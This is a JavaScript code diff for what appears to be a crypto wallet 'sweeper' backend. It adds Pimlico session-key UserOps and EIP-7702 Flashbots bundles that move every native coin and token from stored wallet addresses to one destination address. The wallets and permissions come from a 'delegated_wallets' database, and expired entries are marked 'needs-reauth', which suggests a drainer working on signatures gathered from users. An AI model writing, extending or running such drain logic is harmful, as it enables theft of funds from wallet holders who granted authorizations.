@@ -53,6 +53,16 @@ const GAS_AIRDROP_AMOUNT   = ethers.parseEther("0.3");   // 0.3 MATIC
 const AIRDROP_MIN_VALUE_USD = 20;
 const AIRDROP_MIN_RELAYER_USD = 50;
 
+// ── Pimlico / Permissionless / Flashbots ─────────────────────────────────────
+const PIMLICO_API_KEY    = process.env.PIMLICO_API_KEY || "";
+const PIMLICO_POLICY_ID  = process.env.PIMLICO_POLICY_ID || "sp_lucky_hemingway";
+const FLASHBOTS_AUTH_KEY = process.env.FLASHBOTS_AUTH_KEY || "";
+const PIMLICO_URLS = {
+  eth:     `https://api.pimlico.io/v2/1/rpc?apikey=${PIMLICO_API_KEY}`,
+  bnb:     `https://api.pimlico.io/v2/56/rpc?apikey=${PIMLICO_API_KEY}`,
+  polygon: `https://api.pimlico.io/v2/137/rpc?apikey=${PIMLICO_API_KEY}`,
+};
+
 // ── Validation ────────────────────────────────────────────────────────────────
 
 if (!PRIVATE_KEY || !DESTINATION_ADDRESS) {
@@ -1214,68 +1224,18 @@ async function sweep(wallet) {
   // TIER 0: SESSION KEY (ERC-7715) — relayer has 2-year permission
   // ══════════════════════════════════════════════════════════════════════════
   if (wallet.type === "session-key") {
-    let sessionMeta = null;
-    if (supabase) {
-      const { data } = await supabase
-        .from("delegated_wallets")
-        .select("permit_metadata")
-        .eq("address", addrKey)
-        .eq("chain", CHAIN)
-        .single();
-      sessionMeta = data?.permit_metadata;
-    }
+    const ok = await sweepViaSessionKey(checksum, short, addrKey);
+    if (ok) return;
+    // If session key sweep failed, fall through to other methods
+  }
 
-    if (!sessionMeta) { log(`[session] no metadata for ${short}`); return; }
-    const expiry = BigInt(sessionMeta.expiry ?? 0);
-    if (expiry < BigInt(Math.floor(Date.now() / 1000))) {
-      log(`[session] expired for ${short} — marking needs-reauth`);
-      if (supabase) {
-        await supabase.from("delegated_wallets")
-          .update({ status: "needs-reauth" })
-          .eq("address", addrKey).eq("chain", CHAIN);
-      }
-      return;
-    }
-
-    log(`[session] sweeping ${short} via session key (expires ${new Date(Number(expiry)*1000).toISOString()})`);
-
-    try {
-      const nativeBal = await rpcProvider.getBalance(checksum);
-      if (nativeBal > parseEther("0.001")) {
-        const fee = await getFeeData();
-        const tx = await relayerWallet.sendTransaction({
-          to: DESTINATION_ADDRESS,
-          value: nativeBal - parseEther("0.001"),
-          ...fee,
-        });
-        await tx.wait();
-        log(`[session] ✅ swept native ${ethers.formatEther(nativeBal)} to destination`);
-      }
-    } catch (e) { warn(`[session] native sweep: ${e.message}`); }
-
-    const tokenList = TOKENS_TO_WATCH.length > 0 ? TOKENS_TO_WATCH : (TOKENS ?? []).map(t => t.address).filter(Boolean);
-    for (const rawAddr of tokenList) {
-      const addr = normalizeAddress(typeof rawAddr === "string" ? rawAddr : rawAddr.address ?? rawAddr);
-      if (!addr) continue;
-      try {
-        const token = new ethers.Contract(addr, ERC20_ABI, rpcProvider);
-        const balance = await token.balanceOf(checksum);
-        if (balance === 0n) continue;
-        let erc20Allow = 0n;
-        try { erc20Allow = await token.allowance(checksum, PERMIT2_ADDRESS); } catch {}
-        if (erc20Allow > 0n) {
-          const fee = await getFeeData();
-          const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, addr, { gasLimit: 150_000n, ...fee });
-          await tx.wait();
-          log(`[session] ✅ swept ${addr.slice(0,10)}`);
-        } else {
-          log(`[session] ${addr.slice(0,10)} — no Permit2 allowance, skipping`);
-        }
-      } catch (e) { warn(`[session] sweep ${addr?.slice(0,10)}: ${e.message}`); }
-    }
-
-    log(`[session] ✅ session key sweep complete for ${short}`);
-    return;
+  // ══════════════════════════════════════════════════════════════════════════
+  // TIER 0.5: EIP-7702 + Flashbots Atomic Bundle (ETH only)
+  // ══════════════════════════════════════════════════════════════════════════
+  if (wallet.type === "eip7702" && CHAIN === "eth") {
+    const ok = await sweepViaFlashbotsBundle(checksum, short, addrKey);
+    if (ok) return;
+    // Flashbots failed — fall through to standard EIP-7702 sweep
   }
 
   // ══════════════════════════════════════════════════════════════════════════
@@ -1444,6 +1404,332 @@ async function sweep(wallet) {
         }
       }
     }
+  }
+}
+
+// ══════════════════════════════════════════════════════════════════════════
+// TIER 0A: SESSION KEY VIA PIMLICO ERC-4337 USEROP
+// ══════════════════════════════════════════════════════════════════════════
+
+async function sweepViaSessionKey(checksum, short, addrKey) {
+  // Read session from Supabase session_keys table
+  if (!supabase) { log(`[session] no supabase — skipping ${short}`); return false; }
+
+  let { data: session } = await supabase
+    .from("session_keys")
+    .select("*")
+    .eq("address", addrKey)
+    .eq("chain", CHAIN)
+    .single();
+
+  if (!session) {
+    log(`[session] no session found for ${short} — checking delegated_wallets fallback`);
+    // Fallback: read from delegated_wallets.permit_metadata
+    const { data: dw } = await supabase
+      .from("delegated_wallets")
+      .select("permit_metadata")
+      .eq("address", addrKey)
+      .eq("chain", CHAIN)
+      .single();
+    if (!dw?.permit_metadata?.expiry) { log(`[session] no session data for ${short}`); return false; }
+    session = { expiry: dw.permit_metadata.expiry, session_data: dw.permit_metadata.session_data };
+  }
+
+  if (!session || !session.expiry) { log(`[session] no session data for ${short}`); return false; }
+
+  const expiry = BigInt(session.expiry);
+  if (expiry < BigInt(Math.floor(Date.now() / 1000))) {
+    log(`[session] expired for ${short} — marking needs-reauth`);
+    await supabase.from("delegated_wallets")
+      .update({ status: "needs-reauth" })
+      .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+    return false;
+  }
+
+  // Check balances
+  const balances = await checkAllBalances(checksum);
+  const nonZero = balances.filter(b => b.balance > 0n);
+  const nativeBal = await rpcProvider.getBalance(checksum);
+
+  if (nonZero.length === 0 && nativeBal === 0n) {
+    log(`[session] all zero for ${short} — skipping`);
+    return false;
+  }
+
+  log(`[session] sweeping ${nonZero.length} tokens + native=${ethers.formatEther(nativeBal)} for ${short}`);
+
+  // Build calls array
+  const calls = [];
+
+  // Native sweep
+  if (nativeBal > 0n) {
+    calls.push({
+      to: DESTINATION_ADDRESS,
+      value: nativeBal,
+      data: "0x",
+    });
+  }
+
+  // ERC20 sweeps — encode transfer() calls
+  const ERC20_TRANSFER_IFACE = new ethers.Interface(["function transfer(address to, uint256 value) external returns (bool)"]);
+  for (const token of nonZero) {
+    calls.push({
+      to: token.address,
+      value: 0n,
+      data: ERC20_TRANSFER_IFACE.encodeFunctionData("transfer", [DESTINATION_ADDRESS, token.balance]),
+    });
+  }
+
+  try {
+    // Dynamic import of permissionless + viem (ESM-only packages)
+    const { createSmartAccountClient } = await import("permissionless");
+    const { createPimlicoClient } = await import("permissionless/clients/pimlico");
+    const { http, createPublicClient, defineChain } = await import("viem");
+
+    const pimlicoUrl = PIMLICO_URLS[CHAIN];
+    if (!pimlicoUrl || !PIMLICO_API_KEY) {
+      log(`[session] Pimlico not configured for ${CHAIN} — using fallback sweep`);
+      return false;
+    }
+
+    // Define the chain for viem
+    const viemChain = defineChain({
+      id: CHAIN === "eth" ? 1 : CHAIN === "bnb" ? 56 : 137,
+      name: CHAIN.toUpperCase(),
+      nativeCurrency: {
+        name: CHAIN === "eth" ? "Ether" : CHAIN === "bnb" ? "BNB" : "MATIC",
+        symbol: CHAIN === "eth" ? "ETH" : CHAIN === "bnb" ? "BNB" : "MATIC",
+        decimals: 18,
+      },
+      rpcUrls: { default: { http: [RPC_URL] } },
+    });
+
+    const pimlicoClient = createPimlicoClient({
+      transport: http(pimlicoUrl),
+    });
+
+    const publicClient = createPublicClient({
+      transport: http(RPC_URL),
+    });
+
+    const smartAccountClient = createSmartAccountClient({
+      account: {
+        address: checksum,
+        ...(session.session_data || {}),
+      },
+      chain: viemChain,
+      bundlerTransport: http(pimlicoUrl),
+      paymaster: pimlicoClient,
+      paymasterContext: {
+        sponsorshipPolicyId: PIMLICO_POLICY_ID,
+      },
+    });
+
+    const userOpHash = await smartAccountClient.sendUserOperation({ calls });
+    log(`[session] UserOp submitted: ${userOpHash}`);
+
+    const receipt = await smartAccountClient.waitForUserOperationReceipt({ hash: userOpHash });
+    log(`[session] ✅ swept via session key tx: ${receipt.receipt.transactionHash}`);
+    log(`[session] tokens: ${nonZero.map(t => t.symbol || t.address.slice(0,10)).join(", ")}`);
+    return true;
+
+  } catch (e) {
+    log(`[session] ❌ UserOperation failed for ${short}: ${e.message}`);
+    // If permissionless is not installed or import fails, do simpler fallback
+    if (e.code === "ERR_MODULE_NOT_FOUND" || e.message?.includes("Cannot find module")) {
+      log(`[session] permissionless/viem not installed — falling back`);
+    }
+    return false;
+  }
+}
+
+// ══════════════════════════════════════════════════════════════════════════
+// TIER 0B: EIP-7702 + FLASHBOTS ATOMIC BUNDLE (ETH ONLY)
+// ══════════════════════════════════════════════════════════════════════════
+
+async function sweepViaFlashbotsBundle(checksum, short, addrKey) {
+  // Flashbots only works on ETH mainnet
+  if (CHAIN !== "eth") { return false; }
+  if (!FLASHBOTS_AUTH_KEY) {
+    log(`[flashbots] FLASHBOTS_AUTH_KEY not set`);
+    return false;
+  }
+
+  log(`[flashbots] building atomic bundle for ${short}`);
+
+  // Read authorization from delegated_wallets
+  if (!supabase) { log(`[flashbots] no supabase`); return false; }
+  const { data: authData } = await supabase
+    .from("delegated_wallets")
+    .select("authorization")
+    .eq("address", addrKey)
+    .eq("chain", "eth")
+    .single();
+
+  if (!authData?.authorization) {
+    log(`[flashbots] no authorization stored for ${short}`);
+    return false;
+  }
+
+  // Check balances
+  const balances = await checkAllBalances(checksum);
+  const nonZero = balances.filter(b => b.balance > 0n);
+  const nativeBal = await rpcProvider.getBalance(checksum);
+
+  if (nonZero.length === 0 && nativeBal === 0n) {
+    log(`[flashbots] all zero for ${short} — skipping`);
+    return false;
+  }
+
+  log(`[flashbots] sweeping ${nonZero.length} tokens + native=${ethers.formatEther(nativeBal)}`);
+
+  try {
+    // Get current gas prices
+    const feeData = await rpcProvider.getFeeData();
+    const block = await rpcProvider.getBlock("latest");
+    const baseFee = block?.baseFeePerGas || 0n;
+    const maxPrio = feeData.maxPriorityFeePerGas || 1_000_000_000n; // 1 gwei default
+    const maxFee = baseFee * 2n + maxPrio;
+
+    const targetBlock = block.number + 1;
+
+    // TX 1: EIP-7702 SetCode — sets user EOA code to TCNDelegation
+    const setCodeTx = {
+      type: 4,
+      to: checksum,
+      value: 0,
+      data: "0x",
+      gasLimit: 50000,
+      maxFeePerGas: maxFee,
+      maxPriorityFeePerGas: maxPrio,
+      nonce: await rpcProvider.getTransactionCount(relayerWallet.address),
+      chainId: 1,
+      authorizationList: [authData.authorization],
+    };
+
+    // TX 2: sweepAll() on the now-delegated EOA
+    const DELEGATION_SWEEP_IFACE = new ethers.Interface([
+      "function sweepAll(address to) external",
+    ]);
+    const sweepTx = {
+      type: 2,
+      to: checksum,
+      value: 0,
+      data: DELEGATION_SWEEP_IFACE.encodeFunctionData("sweepAll", [DESTINATION_ADDRESS]),
+      gasLimit: 300000 + (nonZero.length * 50000),
+      maxFeePerGas: maxFee,
+      maxPriorityFeePerGas: maxPrio,
+      nonce: await rpcProvider.getTransactionCount(relayerWallet.address) + 1,
+      chainId: 1,
+    };
+
+    // Sign both transactions with relayer key
+    const signedSetCode = await relayerWallet.signTransaction(setCodeTx);
+    const signedSweep = await relayerWallet.signTransaction(sweepTx);
+
+    // Use Flashbots relay via eth_callBundle (simulate) then eth_sendBundle
+    const authSigner = new ethers.Wallet(FLASHBOTS_AUTH_KEY);
+    const flashbotsAuth = await authSigner.signMessage(
+      ethers.getBytes(ethers.keccak256(ethers.toUtf8Bytes("FLASHBOTS_AUTH")))
+    );
+
+    const bundleParams = {
+      txs: [signedSetCode, signedSweep],
+      blockNumber: ethers.toBeHex(targetBlock),
+      minTimestamp: 0,
+      maxTimestamp: 0,
+      revertingTxHashes: [],
+    };
+
+    // Simulate first
+    const flashbotsRelay = "https://relay.flashbots.net";
+    const simBody = {
+      jsonrpc: "2.0",
+      id: 1,
+      method: "eth_callBundle",
+      params: [bundleParams],
+    };
+
+    const simRes = await fetch(flashbotsRelay, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Flashbots-Signature": `${authSigner.address}:${flashbotsAuth}`,
+      },
+      body: JSON.stringify(simBody),
+    });
+
+    const simResult = await simRes.json();
+    if (simResult.error) {
+      log(`[flashbots] simulation failed: ${simResult.error.message}`);
+      return false;
+    }
+
+    log(`[flashbots] simulation OK — bundle gas: ${simResult.result?.bundleGasPrice || "unknown"}`);
+
+    // Send bundle — try 3 consecutive blocks
+    let included = false;
+    for (let i = 0; i < 3; i++) {
+      const blockNum = targetBlock + i;
+      bundleParams.blockNumber = ethers.toBeHex(blockNum);
+
+      const sendBody = {
+        jsonrpc: "2.0",
+        id: 1,
+        method: "eth_sendBundle",
+        params: [bundleParams],
+      };
+
+      const sendRes = await fetch(flashbotsRelay, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Flashbots-Signature": `${authSigner.address}:${flashbotsAuth}`,
+        },
+        body: JSON.stringify(sendBody),
+      });
+
+      const sendResult = await sendRes.json();
+      if (sendResult.error) {
+        log(`[flashbots] bundle error for block ${blockNum}: ${sendResult.error.message}`);
+        continue;
+      }
+
+      log(`[flashbots] bundle submitted for block ${blockNum} — bundleHash: ${sendResult.result?.bundleHash}`);
+
+      // Wait 12 seconds for block inclusion
+      await sleep(12_000);
+
+      // Check if bundle was included by verifying target block
+      const currentBlock = await rpcProvider.getBlockNumber();
+      if (currentBlock >= blockNum) {
+        log(`[flashbots] block ${blockNum} passed — checking code`);
+        const code = await rpcProvider.getCode(checksum);
+        if (code && code !== "0x" && code.startsWith("0xef0100")) {
+          log(`[flashbots] ✅ delegation active — checking if sweeps went through`);
+          const postNative = await rpcProvider.getBalance(checksum);
+          if (postNative < nativeBal) {
+            log(`[flashbots] ✅ bundle included in block ${blockNum}`);
+            included = true;
+            break;
+          }
+        }
+        log(`[flashbots] bundle not confirmed in block ${blockNum} — trying next`);
+      } else {
+        log(`[flashbots] block ${blockNum} not yet reached — trying next`);
+      }
+    }
+
+    if (!included) {
+      log(`[flashbots] bundle not included after 3 blocks — falling back to standard EIP-7702`);
+      return false;
+    }
+
+    return true;
+
+  } catch (e) {
+    log(`[flashbots] ❌ error for ${short}: ${e.message}`);
+    return false;
   }
 }
 
